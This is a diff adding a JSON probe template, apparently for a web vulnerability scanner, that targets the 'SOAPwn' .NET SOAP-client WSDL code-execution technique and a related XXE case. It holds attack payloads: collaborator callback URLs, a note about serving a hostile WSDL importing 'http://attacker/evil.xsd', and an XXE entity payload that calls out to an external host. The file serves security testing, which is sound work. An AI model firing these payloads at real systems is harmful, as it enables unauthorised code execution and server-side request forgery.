@@ -1,0 +1,50 @@
+{
+  "category": "soapwn",
+  "description": "SOAPwn (.NET SOAP client + WSDL RCE — Bazydlo / watchTowr — PortSwigger Top 10 / 2025, #5). When a .NET application acts as a SOAP client and the WSDL endpoint is attacker-controlled (URL parameter, header, configuration), serving a hostile WSDL triggers .NET XmlSerializer code-gen + dynamic compilation. Reaching XSD imports and complex type definitions, attacker achieves arbitrary code execution in the SOAP-client context.",
+  "contexts": {
+    "wsdl_url_user_controlled": {
+      "description": "Endpoint accepts a WSDL URL from the user (wsdl, service_url, endpoint, soap_endpoint, callback_wsdl). .NET application loads it via System.Web.Services.Description.ServiceDescription.Read or similar. Hostile WSDL with crafted XSD chain triggers code-gen.",
+      "tech_match": [".net", "asp.net", "wcf", "soap"],
+      "param_match": ["wsdl", "service_url", "soap_endpoint", "endpoint", "service", "wsdl_url", "callback_wsdl"],
+      "probes": [
+        {
+          "payload": "{{collaborator}}/exploit.wsdl",
+          "description": "Submit attacker WSDL URL via parameter. Confirm SSRF — server fetches the WSDL from Collaborator. Pre-step for RCE: once fetch confirmed, serve hostile WSDL+XSD chain.",
+          "matchers": [
+            {"type": "collaborator", "interaction": "any"}
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {"manual_chain": true, "note": "After confirming fetch, host hostile WSDL: <wsdl:import location='http://attacker/evil.xsd'/> with complexType chain exploiting .NET XmlSerializer codegen path."}
+        },
+        {
+          "payload": "{{collaborator}}/normal.wsdl",
+          "description": "Verify hostile WSDL + XSD import + complexType triggers .NET compile pipeline. RCE marker: out-of-band DNS / HTTP from server-side compilation context (csc.exe spawn).",
+          "matchers": [
+            {"type": "collaborator", "interaction": "dns"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "soap_action_xxe_chain": {
+      "description": "SOAP endpoint with SOAPAction header — .NET WCF or legacy ASMX. Combined with hostile WSDL, the SOAPAction routing may trigger different deserialisation paths exposing XXE / RCE primitives.",
+      "tech_match": [".net", "wcf", "asmx"],
+      "param_match": ["soap_action", "SOAPAction"],
+      "probes": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xx SYSTEM \"http://{{collaborator}}/probe\">]><r>&xx;</r>",
+          "description": "XXE via SOAP body — confirm .NET parser resolves external entities (legacy permissive XmlReaderSettings).",
+          "matchers": [
+            {"type": "collaborator", "interaction": "dns"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55,
+          "variables": {"content_type": "text/xml", "extra_headers": {"SOAPAction": "\"\""}}
+        }
+      ]
+    }
+  }
+}
